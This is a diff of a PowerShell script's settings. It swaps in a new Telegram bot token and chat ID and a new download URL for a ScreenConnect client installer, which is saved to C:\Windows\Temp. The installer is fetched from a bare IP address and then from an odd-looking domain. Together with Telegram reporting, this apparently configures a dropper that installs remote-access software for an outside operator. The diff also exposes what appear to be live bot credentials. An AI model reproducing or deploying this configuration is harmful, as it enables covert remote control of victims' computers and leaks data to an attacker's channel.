@@ -8,11 +8,11 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
 # 1. TELEGRAM CONFIGURATION
-$BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
-$ChatID   = "6867549905"
+$BotToken = "8462063707:AAHfLQ4cRjWkC6RNvInRc8FqydBi9FSqZHQ"
+$ChatID   = "7157127548"
 
 # 2. APPLICATION CONFIGURATION
-$MsiUrl    = "http://50.114.179.239/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+$MsiUrl    = "https://server.luncheoncore.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=frnczz&c=&c=&c=&c=&c=&c=&c="
 $TempDir   = "C:\Windows\Temp"
 $MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
 $LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
